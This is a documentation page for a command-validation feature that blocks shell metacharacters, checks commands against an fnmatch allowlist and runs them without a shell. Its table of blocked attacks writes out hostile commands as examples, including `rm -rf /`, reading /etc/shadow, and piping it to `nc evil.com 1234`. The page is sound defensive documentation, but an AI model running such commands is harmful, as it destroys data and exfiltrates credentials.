---
sidebar_position: 4
---

# Command Enforcement

The `check_command()` method validates shell commands before execution. It combines shell injection prevention with fnmatch-based allowlisting.

## Two-Phase Check

```python
def check_command(self, command: str, tool: str = "") -> bool:
    # Phase 1: Block shell metacharacters
    if _SHELL_METACHARS.search(command):
        self._audit.denied(...)
        raise ForbiddenError("command contains forbidden shell metacharacters")

    # Phase 2: Match against allowlist
    for rule in self._config.permissions.commands:
        if fnmatch.fnmatch(command, rule.pattern):
            if rule.access == AccessLevel.NONE:
                raise ForbiddenError("command explicitly denied")
            self._audit.allowed(...)
            return True

    # No match → use default
    if self._config.permissions.default_command_access == AccessLevel.NONE:
        raise ForbiddenError("command not in allowlist")
    return True
```

## Phase 1: Shell Metacharacter Blocking

The regex `_SHELL_METACHARS` detects characters that enable command chaining, substitution, or redirection:

```python
_SHELL_METACHARS = re.compile(r"[;&|`$(){}\]\[<>!\\'\"]")
```

Blocked characters and the attacks they prevent:

| Character | Attack Type | Example (Blocked) |
|---|---|---|
| `;` | Command chaining | `ls; rm -rf /` |
| `&` | Background + chaining | `ls & rm -rf /` |
| `\|` | Pipe chaining | `cat /etc/shadow \| nc evil.com 1234` |
| `` ` `` | Command substitution | `` echo `cat /etc/shadow` `` |
| `$()` | Command substitution | `echo $(cat /etc/shadow)` |
| `>` `<` | I/O redirection | `cat /etc/shadow > /tmp/exfil` |
| `{` `}` | Brace expansion | `{cat,/etc/shadow}` |
| `!` | History expansion | `!rm` |
| `"` `'` | Quote injection | `echo "safe"; rm -rf /` |

## Phase 2: Pattern Matching

After passing the metacharacter check, the full command string is matched against configured patterns using `fnmatch.fnmatch()` (shell-style glob matching):

```python
import fnmatch

# fnmatch.fnmatch("systemctl status nginx", "systemctl status *")  → True
# fnmatch.fnmatch("systemctl restart nginx", "systemctl status *") → False
# fnmatch.fnmatch("docker ps -a", "docker ps*")                    → True
```

### Pattern Design Guidelines

**Good patterns** (specific, limited scope):
```yaml
commands:
  - pattern: "systemctl status nginx"       # Exact command
  - pattern: "systemctl status *"            # Any service status
  - pattern: "docker ps*"                    # docker ps variants
  - pattern: "journalctl -u nginx -n *"      # Specific journal query
```

**Bad patterns** (too broad, security risk):
```yaml
commands:
  - pattern: "*"               # Allows everything — never do this
  - pattern: "systemctl *"     # Allows restart, stop, etc. — too broad
  - pattern: "docker *"        # Allows docker rm, docker exec — too broad
```

## Explicit Denies

Just like path rules, commands with `access: none` are explicitly denied and take priority:

```yaml
commands:
  - pattern: "docker *"
    access: active                     # Allow all docker commands
  - pattern: "docker rm *"
    access: none                       # But explicitly deny docker rm
```

## No Shell Interpreter

Commands are executed directly as a process, not through a shell interpreter. This means:

```python
# NOT this (insecure):
subprocess.run(command, shell=True)

# This (secure):
subprocess.run(command.split())
```

Without a shell, even if metacharacters somehow bypassed the regex check, shell expansion would not occur. Commands are executed as literal argument arrays.
